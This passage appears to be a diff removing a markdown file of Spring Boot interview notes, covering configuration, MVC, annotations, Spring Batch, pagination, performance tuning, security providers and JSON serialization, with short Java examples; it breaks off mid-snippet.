-spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver
-spring.jpa.database-platform=org.hibernate.dialect.MySQL8Dialect
-Example for PostgreSQL:
-properties
-
-spring.datasource.url=jdbc:postgresql://localhost:5432/your_database
-spring.datasource.username=postgres
-spring.datasource.password=your_password
-spring.datasource.driver-class-name=org.postgresql.Driver
-spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
-
-3. Handle Database Schema Changes
-   
-If you are using Hibernate, update spring.jpa.hibernate.ddl-auto based on your needs:
-
-create – Drops and recreates the database schema on each run.
-update – Updates the schema without dropping existing tables.
-validate – Only validates if the schema matches but doesn’t modify it.
-none – Does nothing.
-Example:
-
-properties
-
-spring.jpa.hibernate.ddl-auto=update
-If using Flyway or Liquibase for migrations, update migration scripts accordingly.
-
-4. Clear Cache and Restart
-   
-After making these changes:
-
-Clean and build the project:
-
-mvn clean package
-Restart your Spring Boot application:
-sh
-
-mvn spring-boot:run
-
-5. Check Database Connection
-   
-If using MySQL or PostgreSQL, you can test the connection using:
-
-mysql -u root -p -h localhost -P 3306
-or
-sh
-
-psql -U postgres -h localhost -p 5432
-
-7. Update schema.sql and data.sql (Optional)
-   
-If you have hardcoded SQL scripts, update them to match the new database syntax.
-
-
-### MVC (Model-View-Controller) in Spring Boot
-
-Spring Boot follows the MVC (Model-View-Controller) design pattern to build web applications in a structured and maintainable way.
-
-1. Components of MVC in Spring Boot
-   
-1️⃣ Model
-
-Represents the application's data and business logic.
-Usually implemented using POJOs (Plain Old Java Objects), JPA Entities, or DTOs.
-
-2️⃣ View
-
-Represents the UI (User Interface).
-In Spring Boot, views can be created using:
-Thymeleaf (default template engine)
-JSP (Java Server Pages)
-React/Angular (in a separate frontend)
-
-3️⃣ Controller
-
-Handles user requests and interacts with the model.
-Uses @Controller or @RestController annotation.
-
-## 2. How MVC Works in Spring Boot
-
-User sends a request (e.g., /user).
-
-Controller processes the request and interacts with the Model.
-
-Model holds business data (e.g., fetches from a database).
-
-View renders the response with model data (e.g., Thymeleaf).
-
-## When to Use Spring MVC?
-
-✅ Building web applications with UI (e.g., Thymeleaf)
-
-✅ Creating REST APIs using Spring Boot
-
-✅ Integrating with databases using Spring JPA
-
-### Steps to Create a Custom Exception in Spring Boot
-
-### a) Create a Custom Exception Class
-
- Extend RuntimeException (or Exception if checked exception is needed).
- 
- Define constructors to accept error messages or causes.
-
- 
-### b)Create a Global Exception Handler
-
- Use @ControllerAdvice to handle exceptions globally.
- 
- Define methods with @ExceptionHandler to return custom error responses.
- 
-### c)Throw the Custom Exception
-
-Inside the service or controller, throw the custom exception when needed.
-
-### d) Customize HTTP Response (Optional)
-
-Use @ResponseStatus to set an HTTP status code.
-Return a structured response using ResponseEntity<>.
-
-### e) Test the Exception Handling
-
-Use Postman or JUnit tests to verify that the exception is handled properly.
-
-
-### ANNOTATION
-
-1) @Component in Spring Boot is an annotation used to mark a class as a Spring-managed bean. In simple words, it tells Spring to automatically create an object (bean) of that class and manage its lifecycle.
-2) @Autowired in Spring is used for automatic dependency injection. It tells Spring to automatically inject an instance of the required bean into a class, so you don’t have to create it manually.
-3) @Service is a specialized version of @Component, meaning it tells Spring to create and manage an instance (bean) of the class.
-When the application starts, Spring automatically detects classes annotated with @Service (thanks to Component Scanning) and registers them as beans.
-
-4)@RestController → Used for REST APIs (returns JSON, plain text).
-✅ @Controller → Used for MVC applications (returns HTML views).
-
-5)@RequestBody in Spring Boot
-The @RequestBody annotation is used in Spring Boot to map the HTTP request body to a Java object. It is mainly used in REST APIs to receive JSON or other data formats sent by the client.
-
-### Why Use @ResponseBody?
-
-When you want to return JSON or raw data instead of a webpage.
-
-Used in REST APIs to send JSON responses.
-
-Works well with @RestController, which applies it to all methods automatically.
-
-### How It Works?
-
-Without @ResponseBody:
-Spring Boot assumes you want to return a webpage (view).
-
-With @ResponseBody:
-Spring Boot converts the response directly into JSON (or XML) and sends it back to the client.
-
-
-
-
-
-
-### @PathVariable
-It is an annotation in Spring Boot used to extract values from the URI (Uniform Resource Identifier) and pass them as method parameters in a REST controller. It is commonly used in RESTful APIs to handle dynamic path parameters.
-
-### @RequestParam (Query Parameters) in Spring Boot
-
-@RequestParam is used in Spring Boot to extract query parameters from the URL. Query parameters are typically used for filtering, sorting, pagination, or optional parameters in API requests.
-
-@RequestParam String name extracts the name query parameter from the request.
-
-If the query parameter is not present, Spring will throw an error since @RequestParam is required by default.
-
-Using @RequestParam with Default Values
-To avoid errors when a query parameter is missing, we can provide a default value.
-
-```
-@RestController
-@RequestMapping("/employees")
-public class EmployeeController {
-
-    @GetMapping("/filter")
-    public String filterEmployees(@RequestParam(defaultValue = "10") int limit) {
-        return "Fetching " + limit + " employees";
-    }
-}
-```
-
-### When to Use @PathVariable?
-Use @PathVariable when you need to extract mandatory values from the URL path to identify a resource.
-
-✅ Best for:
-
-Identifying a specific resource (id, username, etc.).
-Creating RESTful endpoints that follow best practices.
-
-### When to Use @RequestParam?
-Use @RequestParam when you need to extract optional or filtering values from the query string.
-
-✅ Best for:
-
-Filtering, sorting, and pagination (page, size, sort).
-Providing optional request parameters.
-
-
-### Difference Between Spring and Spring Boot
-
-| Feature                | Spring Framework                                         | Spring Boot                                                  |
-|------------------------|---------------------------------------------------------|--------------------------------------------------------------|
-| **Definition**         | A comprehensive framework for Java-based enterprise applications. | A subproject of Spring that simplifies application setup and development. |
-| **Configuration**      | Requires manual configuration (XML or Java-based).      | Provides auto-configuration (less boilerplate code).        |
-| **Standalone**         | Needs explicit setup of a web server like Tomcat, Jetty. | Comes with embedded servers like Tomcat, Jetty, Undertow.   |
-| **Dependency Management** | Requires manual dependency management using Maven/Gradle. | Provides pre-configured dependencies via `spring-boot-starter` dependencies. |
-| **Microservices Support** | Can be used for microservices but needs extra configurations. | Built-in support for microservices with Spring Cloud. |
-| **Application Size**   | Requires writing a lot of boilerplate code.             | Less code, production-ready in minutes.                     |
-| **Performance**        | Can be slower due to explicit configurations.           | Faster startup due to auto-configuration and optimized defaults. |
-| **Deployment**         | Generates a WAR file that needs an external server.     | Generates a JAR file with an embedded server, so it runs independently. |
-| **Spring MVC vs Spring Boot** | Spring MVC needs manual setup (dispatcher, templates, etc.). | Spring Boot auto-configures Spring MVC. |
-| **Example of Starting a Web App** | Needs `web.xml`, dispatcher servlet, and additional configs. | Just use `@SpringBootApplication`, and it runs! |
-
-
-### IOC
-
-IoC in Spring improves modularity, testability, and maintainability by handling object creation and dependency injection automatically. Instead of hardcoding dependencies, Spring injects them dynamically, making applications more flexible and scalable.
-
-### Spring MVC Architecture Diagram
-
-Client (Browser)  →  DispatcherServlet  →  Controller  →  Service Layer  →  DAO (Database Access)
-                                      ↓
-                                   View Resolver
-                                      ↓
-                                     View (JSP, Thymeleaf)
-
-
-
-### Spring MVC Flow (Step-by-Step)
-
-### Client Request
-
-A user sends a request (e.g., clicking a button or entering a URL).
-
-### DispatcherServlet (Front Controller)
-
-Intercepts the request and delegates it to the appropriate controller.
-
-### Handler Mapping
-
-Determines which controller should handle the request.
-### Controller (Request Handling)
-
-Processes the request, interacts with the service layer, and returns a response.
-### Service Layer (Business Logic - Optional)
-
-Handles business operations and communicates with the database.
-### DAO (Data Access Object) - Optional
-
-Retrieves or stores data in the database.
-### Model (Data Transfer)
-
-Stores data to be displayed in the view.
-### View Resolver
-
-Determines the correct view (JSP, Thymeleaf, etc.) to display the response.
-### View (UI Layer)
-
-Renders the response as HTML, JSON, or another format.
-### Response Sent to Client
-
-The final output is sent back to the browser.
-
-
-## How I Used Spring Batch in My Project
-I used Spring Batch to process client-provided files by implementing a multi-step batch pipeline. Here’s how I integrated it:
-
-### 1. Job Definition
-I defined a Spring Batch Job that processes files in multiple steps:
-
-Step 1: Read the file and parse it into Java objects.
-Step 2: Validate and transform the data.
-Step 3: Store the processed data into a staging table using JPA.
-Step 4: Trigger a Kafka event to notify downstream services.
-
-### 2. File Processing with Spring Batch
-I implemented chunk-based processing where data is read in batches rather than loading everything into memory at once.
-
-```
-@Configuration
-@EnableBatchProcessing
-public class FileProcessingBatchConfig {
-
-    @Autowired
-    private JobBuilderFactory jobBuilderFactory;
-
-    @Autowired
-    private StepBuilderFactory stepBuilderFactory;
-
-    @Autowired
-    private DataSource dataSource;
-
-    @Bean
-    public Job fileProcessingJob(Step fileProcessingStep) {
-        return jobBuilderFactory.get("fileProcessingJob")
-                .incrementer(new RunIdIncrementer())
-                .start(fileProcessingStep)
-                .build();
-    }
-
-    @Bean
-    public Step fileProcessingStep(ItemReader<FileData> reader, 
-                                   ItemProcessor<FileData, ProcessedData> processor,
-                                   ItemWriter<ProcessedData> writer) {
-        return stepBuilderFactory.get("fileProcessingStep")
-                .<FileData, ProcessedData>chunk(100) // Process data in chunks of 100
-                .reader(reader)
-                .processor(processor)
-                .writer(writer)
-                .build();
-    }
-}
-```
-### 3. Implementing the Reader (ItemReader)
-I used FlatFileItemReader to read CSV files and convert them into Java objects.
-
-```
-@Bean
-public FlatFileItemReader<FileData> reader() {
-    return new FlatFileItemReaderBuilder<FileData>()
-            .name("fileReader")
-            .resource(new FileSystemResource("input/data.csv"))
-            .delimited()
-            .names("id", "name", "email", "amount")
-            .fieldSetMapper(new BeanWrapperFieldSetMapper<>() {{
-                setTargetType(FileData.class);
-            }})
-            .build();
-}
-```
-
-# 4. Implementing the Processor (ItemProcessor)
-I performed data validation and transformation in the processor.
-
-
-@Component
-public class FileProcessor implements ItemProcessor<FileData, ProcessedData> {
-    @Override
-    public ProcessedData process(FileData item) {
-        // Business logic: Data validation & transformation
-        if (item.getAmount() < 0) {
-            throw new ValidationException("Invalid amount");
-        }
-        return new ProcessedData(item.getId(), item.getName().toUpperCase(), item.getEmail(), item.getAmount());
-    }
-}
-
-# 5. Implementing the Writer (ItemWriter)
-I used JPA ItemWriter to store the data in the database.
-
-
-@Bean
-public JpaItemWriter<ProcessedData> writer(EntityManagerFactory entityManagerFactory) {
-    JpaItemWriter<ProcessedData> writer = new JpaItemWriter<>();
-    writer.setEntityManagerFactory(entityManagerFactory);
-    return writer;
-}
-# 6. Integrating Kafka for Event Triggering
-After processing the data, I published Kafka events to notify downstream services.
-
-@Component
-public class KafkaNotificationListener extends JobExecutionListenerSupport {
-    @Autowired
-    private KafkaTemplate<String, String> kafkaTemplate;
-
-    @Override
-    public void afterJob(JobExecution jobExecution) {
-        if (jobExecution.getStatus() == BatchStatus.COMPLETED) {
-            kafkaTemplate.send("processed-files-topic", "File processing completed successfully.");
-        }
-    }
-}
-### Benefits of Using Spring Batch in My Project
-✅ Efficient Large File Processing – Used chunk-based processing to avoid memory overflow.
-✅ Automatic Restart – Jobs could resume from the last successful step in case of failure.
-✅ Scalability – Kafka integration ensured faster downstream processing.
-✅ Security – Used Spring Security and OAuth2 for authentication.
-✅ Database Optimization – Used indexing and batch inserts to optimize database performance.
-
-### Pageable
-
-Pageable is an interface in Spring Data that provides an abstraction for pagination and sorting when querying a database. It is mainly used with Spring Data JPA to retrieve paginated data efficiently.
-
-To add pagination to an API response in Spring Boot, follow these steps:
-
-### Use Pageable in Repository
-
-To add pagination to an API response in a Spring Boot application, follow these steps:
-
-# 1. Use Pageable in Repository Layer
-Spring Data JPA provides built-in support for pagination using the Pageable interface.
-
-```
-import org.springframework.data.domain.Page;
-import org.springframework.data.domain.Pageable;
-import org.springframework.data.jpa.repository.JpaRepository;
-
-public interface ProductRepository extends JpaRepository<Product, Long> {
-    Page<Product> findAll(Pageable pageable);
-}
-```
-# 2. Modify the Service Layer
-Use Pageable in the service layer to fetch paginated data.
-
-```
-import org.springframework.data.domain.Page;
-import org.springframework.data.domain.Pageable;
-import org.springframework.stereotype.Service;
-
-@Service
-public class ProductService {
-    
-    private final ProductRepository productRepository;
-
-    public ProductService(ProductRepository productRepository) {
-        this.productRepository = productRepository;
-    }
-
-    public Page<Product> getAllProducts(Pageable pageable) {
-        return productRepository.findAll(pageable);
-    }
-}
-```
-# 3. Update Controller to Accept Pagination Parameters
-Expose an endpoint that supports pagination using Pageable.
-
-```
-import org.springframework.data.domain.Page;
-import org.springframework.data.domain.Pageable;
-import org.springframework.web.bind.annotation.*;
-
-@RestController
-@RequestMapping("/api/products")
-public class ProductController {
-    
-    private final ProductService productService;
-
-    public ProductController(ProductService productService) {
-        this.productService = productService;
-    }
-
-    @GetMapping
-    public Page<Product> getProducts(Pageable pageable) {
-        return productService.getAllProducts(pageable);
-    }
-}
-```
-# 4. How to Use Pagination in API Calls
-Spring Boot supports passing pagination parameters via query parameters:
-
-```
-GET /api/products?page=0&size=5&sort=name,asc
-page=0 → First page (zero-based index)
-size=5 → Number of records per page
-sort=name,asc → Sort by name in ascending order
-```
-# 5. Customizing the Default Pageable Configuration
-If you want to set default values for page size and sorting, use:
-
-```
-import org.springframework.data.domain.Sort;
-import org.springframework.data.web.PageableDefault;
-import org.springframework.web.bind.annotation.GetMapping;
-import org.springframework.web.bind.annotation.RequestParam;
-import org.springframework.web.bind.annotation.RestController;
-
-@RestController
-@RequestMapping("/api/products")
-public class ProductController {
-    
-    private final ProductService productService;
-
-    public ProductController(ProductService productService) {
-        this.productService = productService;
-    }
-
-    @GetMapping
-    public Page<Product> getProducts(
-        @PageableDefault(size = 10, sort = "name", direction = Sort.Direction.ASC) Pageable pageable) {
-        return productService.getAllProducts(pageable);
-    }
-}
-```
-# 6. Response Example
-A paginated response will look like this:
-
-```
-{
-    "content": [
-        { "id": 1, "name": "Product A", "price": 100 },
-        { "id": 2, "name": "Product B", "price": 200 }
-    ],
-    "pageable": {
-        "pageNumber": 0,
-        "pageSize": 5
-    },
-    "totalElements": 50,
-    "totalPages": 10,
-    "last": false,
-    "first": true
-}
-```
-# 7. Handling Pagination with Custom Response DTO
-If you want to customize the response, use a DTO:
-
-```
-import java.util.List;
-
-public class PaginatedResponse<T> {
-    private List<T> content;
-    private int pageNumber;
-    private int pageSize;
-    private long totalElements;
-    private int totalPages;
-    private boolean last;
-
-    public PaginatedResponse(Page<T> page) {
-        this.content = page.getContent();
-        this.pageNumber = page.getNumber();
-        this.pageSize = page.getSize();
-        this.totalElements = page.getTotalElements();
-        this.totalPages = page.getTotalPages();
-        this.last = page.isLast();
-    }
-
-    // Getters & Setters
-}
-```
-Modify the controller to return a PaginatedResponse:
-
-```
-@GetMapping
-public PaginatedResponse<Product> getProducts(Pageable pageable) {
-    Page<Product> productPage = productService.getAllProducts(pageable);
-    return new PaginatedResponse<>(productPage);
-}
-```
-
-##  Role-Based Access in Security Configuration (Global Access Control)
-
-1) Spring Security allows role-based access at the request level using HttpSecurity.
-
-2) Spring Security allows us to apply role-based access control at the method level using @PreAuthorize or @Secured.
-
-Enable Method-Level Security
-Add @EnableMethodSecurity in the security configuration:
-
-```
-@Configuration
-@EnableWebSecurity
-@EnableMethodSecurity
-public class SecurityConfig {
-    // Security configuration goes here
-}
-```
-
-
-### 🔍 What is Persistence in JPA / Spring Boot?
-
-Persistence means saving an object’s state into a database so it can be retrieved and used later.
-
-In Java (especially using JPA with Spring Boot), persistence refers to mapping Java objects to database tables and managing their life cycles—this is called Object-Relational Mapping (ORM).
-
-### 🔧 Example:
-```
-@Entity
-public class User {
-    @Id
-    private Long id;
-
-    private String name;
-
-    @Transient // <-- not persisted
-    private String sessionToken;
-}
-```
-Fields like id and name are persisted — i.e., stored in the database.
-
-The sessionToken field is not persisted — JPA will ignore it while saving to or loading from the database.
-
-# 🚀 Spring Boot Performance Optimization Guide
-
-## 1. Optimize Database Access
-- ✅ **Use indexing** on frequently queried columns.
-- ✅ **Use pagination** (`Pageable`) for large result sets.
-- ✅ Avoid **N+1 queries** — use `@EntityGraph` or fetch join in JPQL.
-- ✅ **Use connection pooling** (HikariCP is default in Spring Boot 2+).
-- ✅ **Use batch inserts/updates** (`hibernate.jdbc.batch_size`).
-
-## 🧠 2. Use Caching Wisely
-- ✅ Use **Spring Cache abstraction** (`@Cacheable`, `@CacheEvict`).
-- ✅ Backend options: **Caffeine**, **EhCache**, **Redis**, etc.
-- ✅ Cache **heavy/slow computations** or **frequent DB queries**.
-
-## 🔄 3. Use Asynchronous Processing
-- ✅ Use `@Async` to **offload non-critical tasks** (e.g., sending emails).
-- ✅ Use **CompletableFuture**, **ExecutorService**, or Spring’s async support.
-
-## 🔧 4. Tune JVM and GC
-- ✅ Set appropriate **JVM heap size** (`-Xms`, `-Xmx`).
-- ✅ Choose the right **Garbage Collector** (e.g., **G1GC** for balanced latency).
-- ✅ Use tools like **JVisualVM**, **JFR**, or **YourKit** for profiling.
-
-## 📦 5. Profile and Optimize Beans
-- ✅ Reduce **autowiring of unused beans**.
-- ✅ Use `@Lazy` initialization where necessary.
-- ✅ Avoid **overuse of reflection** and **excessive logging**.
-
-## 📉 6. Minimize Startup Time
-- ✅ Use **Spring Boot 3’s improved GraalVM native support** if needed.
-- ✅ Remove unnecessary dependencies.
-- ✅ Enable lazy initialization:
-  ```properties
-  spring.main.lazy-initialization=true
-
-##  🌐 7. Optimize REST APIs
-- ✅ Use compression (GZIP/Deflate):
-server.compression.enabled=true
-
-- ✅ Use DTOs to avoid exposing entire entity trees.
-
-- ✅ Reduce payload size using Jackson annotations (@JsonIgnore, etc.)
-
-- ✅ Use HTTP/2 or WebFlux for reactive use cases.
-
-## 🧵 8. Concurrency and Thread Pool Tuning
-- ✅ Configure @Async thread pool (TaskExecutor).
-
-- ✅ For web apps: Tune Tomcat thread pool:
-
-```
-server:
-  tomcat:
-    threads:
-      max: 200
-      min-spare: 20
-```
-##  📈 9. Use Metrics and Monitoring
-- ✅ Integrate Micrometer + Prometheus + Grafana.
-
-- ✅ Use Spring Boot Actuator for health and performance metrics.
-
-##  📁 10. Use Efficient Data Formats
-- ✅ Use Protobuf, Avro, or MessagePack for APIs where JSON is too verbose.
-
-- ✅ Enable Jackson streaming API for large JSON processing.
-
-## Spring Boot Actuator 
-
-It is a powerful feature that helps you monitor and manage your Spring Boot application in production with minimal configuration. It exposes various endpoints over HTTP (or JMX), offering insight into your application's health, metrics, environment, and more.
-
-## Spring Boot exposes several built-in endpoints, like:
-
-/actuator/health	- App health status
-/actuator/info -	Custom app info from properties
-/actuator/metrics -	App metrics (JVM, CPU, memory, etc.)
-/actuator/env	- Environment variables
-/actuator/beans	- Beans in the app context
-/actuator/mappings	- All URL mappings
-/actuator/loggers -	Logger levels and configs
-/actuator/threaddump	- JVM thread dump
-
-###  What is the purpose of Spring Boot starters?
-
-Spring Boot starters are a set of predefined dependencies provided by Spring Boot to help developers quickly set up and start working with common technologies and features without manually managing individual library versions.
-
-| Starter Name                   | Use Case                                |
-| ------------------------------ | --------------------------------------- |
-| `spring-boot-starter-web`      | Build REST APIs and web apps            |
-| `spring-boot-starter-data-jpa` | Work with databases using JPA/Hibernate |
-| `spring-boot-starter-security` | Add authentication and authorization    |
-| `spring-boot-starter-test`     | Testing (JUnit, Mockito, Spring Test)   |
-| `spring-boot-starter-actuator` | Monitoring and metrics endpoints        |
-
-
-
-### @RETRYABLE
-
-### @POST CONSTRUCT
-
-The @PostConstruct annotation in Java is used to mark a method that should be executed after a bean has been fully constructed and its dependencies have been injected by a container or framework (like Spring).
-
-Key characteristics and usage:-
-
-Purpose:-
-It serves as a callback method for initialization logic that requires the bean to be in a complete and ready state, including all its injected dependencies. This is distinct from the constructor, which runs before dependency injection.
-
-Execution Timing:-
-The method annotated with @PostConstruct is invoked exactly once during the bean's lifecycle, after its construction and all dependency injection has taken place, but before the bean is put into service.
-
-
-
-### 📌 Key Points:-
-
-Concept	Behavior
-@PostConstruct	Called once after bean creation and injection
-Timing	Before controller methods are invoked
-Trigger	Automatically called by Spring (no manual call needed)
-Purpose	Pre-load or set up the service after construction
-
-### Conditional On Property
-
-## ScanBasePackage
-## Sending Data in Request
-
-### Request Param/Query Param
-### Path Param
-### POJO
-### ELK
-E- Elasticsearch
-L - Longstash
-K - Kibana
-
-## LOGGING
-
-ERROR
-WARN
-INFO
-DEBUG
-TRACE
-
-#### Logging for a file and logging results in a file in springboot application
-
-## Change pattern of logs
-
-### HTTP FILTER
-
-### Tracing with Logging
-MDC(Mapped Diagonsitic)
-
-## Server Side Rendering and Client Side Rendering
-
-### OAuth2.0 and JWT
-In my project, I used OAuth 2.0 for authorization and JWT as the access token format.
-The authorization server issues a JWT access token after successful authentication.
-This token is sent with every API request, and our resource server validates the JWT locally using the public key, checking expiry and scopes before allowing access.”
-
-### ✅ 1-Minute Answer (More Technical, Very Strong ⭐)
-
-“We implemented OAuth 2.0 with JWT to secure our APIs.
-The client application first authenticates via the authorization server, which issues a JWT-based access token.
-The client then sends this token in the Authorization header when calling our backend services.
-Each resource server validates the JWT signature using the authorization server’s public key and enforces access based on scopes and roles.
-This approach gave us stateless authentication, scalability, and secure service-to-service communication.”
-
-### Saga Pattern (In Very Simple Words)
-
-Saga Pattern is a way to complete a big task by doing many small steps, and if any step fails, we undo the previous steps.
-Online Shopping 🛒
-
-1️⃣ You place an order
-2️⃣ Money is deducted
-3️⃣ Item is reserved in warehouse
-
-Now imagine:
-❌ Money deduction fails
-
-What should happen?
-
-Order should be cancelled
-
-Item should be released
-
-👉 That undo process is Saga Pattern
-
-### 🔹 What is an API Gateway? (Very Simple)
-
-API Gateway is a single entry point for all client requests in a microservices system.
-
-Instead of calling many services directly, the client calls one gateway, and the gateway talks to the services.
-
-Client → API Gateway → Microservices
-
-### 🔹 What is Resilience4j? (Simple)
-
-Resilience4j is a Java library that helps your application handle failures gracefully.
-
-Instead of crashing or hanging, your service:
-
-Fails fast
-
-Recovers safely
-
-Protects itself
-
-🔹 Why do we need Resilience4j?
-
-In microservices:
-
-Network calls fail
-
-Services go down
-
-Responses get slow
-
-Too many retries overload system
-
-Resilience4j prevents cascading failures.
-
-
-### How to use multiple Database in your project?
-In our project, we used multiple databases by configuring separate datasources, entity managers, and transaction managers for each database.
-Each service module had its own entities and repositories, ensuring clean separation and proper transaction handling.
-
-### 🔹 What is CAP Theorem? (One line)
-
-In a distributed system, you can guarantee only TWO out of these THREE: Consistency, Availability, and Partition Tolerance.
-
-You cannot have all three at the same time.
-
-####  🔹 What does CAP stand for?
-1️⃣ Consistency (C)
-
-Every user sees the same data at the same time.
-
-Example:
-
-You update your profile
-
-Everyone sees the updated value immediately
-
-2️⃣ Availability (A)
-
-Every request gets a response, even if it’s not the latest data.
-
-Example:
-
-App always responds
-
-Might return slightly old data
-
-3️⃣ Partition Tolerance (P)
-
-System continues to work even if network failure happens between nodes.
-
-Example:
-
-One server cannot talk to another
-
-System still works
-
-🔹 Why Partition Tolerance is mandatory?
-
-In real distributed systems:
-
-Network failures WILL happen
-
-So P is not optional
-
-👉 Real choice is between C vs A
-
-
-### ✅ @PathVariable vs @RequestBody — WHEN & WHY TO USE ?
-
-🔹 1. @PathVariable
-
-Gets data from the URL path
-
-##### Use @PathVariable when:
-
-You are fetching / updating / deleting a specific resource
-
-The value is mandatory
-
-The data is simple (id, name, code)
-
-Used to identify a resource
-
-| Feature        | `@PathVariable`     | `@RequestBody`    |
-| -------------- | ------------------- | ----------------- |
-| Data source    | URL path            | Request body      |
-| Data type      | Simple (id, string) | Complex object    |
-| Mandatory      | Usually yes         | Optional/required |
-| HTTP methods   | GET, DELETE         | POST, PUT         |
-| JSON supported | ❌ No                | ✅ Yes             |
-| Validation     | Limited             | Full (`@Valid`)   |
-```
-
-# ✅ When to Use HTTP POST Instead of GET
-
-## 1️⃣ When You Are Creating New Data
-- POST is used to create a new resource on the server.
-- GET should never create or modify data.
-
-**Example:** Creating a new user, order, payment, or record.
-
----
-
-## 2️⃣ When the Request Changes Server State
-- POST modifies data.
-- GET must be read-only — GET requests should not cause side effects.
-
-**Rule:** If server data changes → use POST.
-
----
-
-## 3️⃣ When Sending Sensitive Data
-- GET sends data in the URL.
-  - URLs can be logged, cached, or stored in browser history.
-- POST sends data in the request body, which is preferable for sensitive information.
-
-**Example:** Passwords, tokens, personal details → POST.
-
----
-
-## 4️⃣ When Sending Large or Complex Data
-- GET has URL length limitations.
-- POST supports large payloads, JSON, XML, and file uploads.
-
-**Example:** Submitting forms with many fields, uploading files → POST.
-
----
-
-## 5️⃣ When Data Structure Is Complex
-- GET supports only simple key–value pairs (query strings).
-- POST supports nested objects, arrays, and complex JSON.
-
-**Example:** An order with items, addresses, and payment info → POST.
-
----
-
-## 6️⃣ When Request Is Not Idempotent
-- POST is not idempotent: calling it multiple times can create multiple records.
-- GET is idempotent and safe for repeated calls.
-
-**Example:** Calling “create order” twice → two orders (POST).
-
----
-
-## 7️⃣ When You Don’t Want the Request to Be Cached
-- GET requests can be cached by browsers and intermediaries.
-- POST requests are not cached by default.
-
-**Example:** Financial transactions, form submissions → POST.
-
----
-
-## ❌ When NOT to Use POST
-- For fetching data only.
-- For searches or reads that do not modify server state.
-
-👉 Use GET instead.
-```
-
-
-# Authentication Providers:-
-
-### 1️⃣ In-Memory Authentication
-
-### 🔹 What it is:
-Users are stored directly in memory (inside application config).
-
-### 🔹 Used for:
-
-Demos
-
-Learning
-
-Very small apps
-
-### 🔹 Example:
-```
-@Bean
-public UserDetailsService userDetailsService() {
-    UserDetails user = User.withUsername("admin")
-            .password("{noop}admin123")
-            .roles("ADMIN")
-            .build();
-    return new InMemoryUserDetailsManager(user);
-}
-```
-
-
-⚠️ Not for production (data lost on restart)
-
-### 2️⃣ JDBC Authentication
- 
-#### 🔹 What it is:
-Users are stored in a relational database (MySQL, PostgreSQL, etc.).
-
-#### 🔹 Used for:
-
-Traditional applications
-
-Enterprise systems
-
-#### 🔹 How it works:
-Spring Security queries users and authorities tables.
-
-🔹 Example:
-```
-auth.jdbcAuthentication()
-    .dataSource(dataSource);
-```
-
-✅ Persistent
-❌ Less flexible than JPA
-
-#### 3️⃣ DAO Authentication (Most Common ✅)
-
-#### 🔹 What it is:
-Uses UserDetailsService + PasswordEncoder.
-
-#### 🔹 Used for:
-
-Real-world Spring Boot applications
-
-Microservices
-
-#### 🔹 How it works:
-Fetches user from DB using JPA/Hibernate.
-
-🔹 Example:
-```
-@Service
-public class CustomUserDetailsService implements UserDetailsService {
-    @Override
-    public UserDetails loadUserByUsername(String username) {
-        return userRepository.findByUsername(username);
-    }
-}
-```
-
-
-✅ Highly flexible
-✅ Production-ready
-✅ Interview favorite
-
-#### 4️⃣ LDAP Authentication
-
-#### 🔹 What it is:
-Authentication via LDAP / Active Directory.
-
-🔹 Used for:
-
-Corporate environments
-
-Enterprise SSO
-
-🔹 Example Use Case:
-Employees logging in using company credentials.
-
-#### 5️⃣ OAuth2 Authentication
-
-#### 🔹 What it is:
-Login via external identity providers.
-
-🔹 Examples:
-
-Google
-
-GitHub
-
-Facebook
-
-🔹 Used for:
-
-Social login
-
-SSO
-
-🔹 Spring Module:
-spring-boot-starter-oauth2-client
-
-✅ Secure
-✅ No password handling by your app
-
-#### 6️⃣ JWT Authentication (Stateless 🔥)
-
-#### 🔹 What it is:
-Token-based authentication using JWT.
-
-#### 🔹 Used for:
-
-REST APIs
-
-Microservices
-
-Mobile apps
-
-🔹 Flow:
-
-User logs in
-
-Server generates JWT
-
-Client sends JWT in headers
-
-Authorization: Bearer <token>
-
-
-✅ Stateless
-✅ Scalable
-❌ Token management required
-
-#### 7️⃣ Pre-Authenticated Authentication
-
-#### 🔹 What it is:
-Authentication happens outside Spring Boot.
-
-#### 🔹 Used for:
-
-API gateways
-
-Reverse proxies
-
-#### 🔹 Example:
-User already authenticated by gateway → Spring trusts it.
-
-#### 8️⃣ Custom Authentication Provider
-
-#### 🔹 What it is:
-You write your own authentication logic.
-
-🔹 Used for:
-
-OTP login
-
-Biometric login
-
-External systems
-
-🔹 Example:
-```
-public class CustomAuthProvider implements AuthenticationProvider {
-    @Override
-    public Authentication authenticate(Authentication auth) {
-        // custom logic
-    }
-}
-```
-
-#### 🔁 How Spring Chooses the Provider
-
-Spring Security uses:
-
-AuthenticationManager
-        ↓
-AuthenticationProvider(s)
-        ↓
-UserDetailsService / External system
-
-⭐ Interview Summary (One-Liner)
-
-Spring Boot supports multiple authentication providers such as In-memory, JDBC, DAO, LDAP, OAuth2, JWT, Pre-Authenticated, and Custom providers, managed via Spring Security’s AuthenticationManager.
-
-
-```
-
-Client Request
-      ↓
-Authentication Filter
-      ↓
-AuthenticationManager
-      ↓
-UserDetailsService
-      ↓
-UserDetails
-
-```
-
-
-### What is UserDetails in Spring Boot?
-
-In Spring Boot, UserDetails is a core interface of Spring Security.
-
-👉 It represents one authenticated user in the Spring Security system.
-
-In simple words:
-
-UserDetails = Who the user is, what password they have, and what roles/authorities they own.
-
-
-### What is JSON Back Reference ?
-
-In Spring Boot, JSON Back Reference usually refers to the annotation:
-
-@JsonBackReference
-
-It is used to prevent infinite recursion while converting Java objects to JSON.
-
-👉 It works together with:
-
-@JsonManagedReference
-
-
-Consider a bi-directional relationship in JPA:
-
-One Parent has many Child
-
-Each Child has a reference back to Parent
-
-Example Relationship
-Parent → Child → Parent → Child → ...
-
-
-#### When Jackson tries to convert this to JSON:
-👉 Infinite loop occurs
-👉 Results in StackOverflowError
-
-### @JsonBackReference is used to prevent infinite recursion in bi-directional relationships by ignoring the back reference during JSON serialization.
-
-
-
-### 1️⃣ @PathVariable – identify the resource
-
-Use it when the value is part of the URL and uniquely identifies something.
-
-Example
-GET /users/101
-```
-@GetMapping("/users/{id}")
-public User getUser(@PathVariable Long id) {
-    return service.getUser(id);
-}
-```
-
-#### When to use
-
-✅ Fetch / update / delete one specific resource
-✅ Mandatory value
-✅ REST-friendly
-
-❌ Don’t use for optional or filter values
-
-### 2️⃣ @RequestParam – filters, flags, small values
-
-Use it for query parameters (after ? in URL).
-
-Example
-GET /users?role=admin&active=true
-```
-@GetMapping("/users")
-public List<User> getUsers(
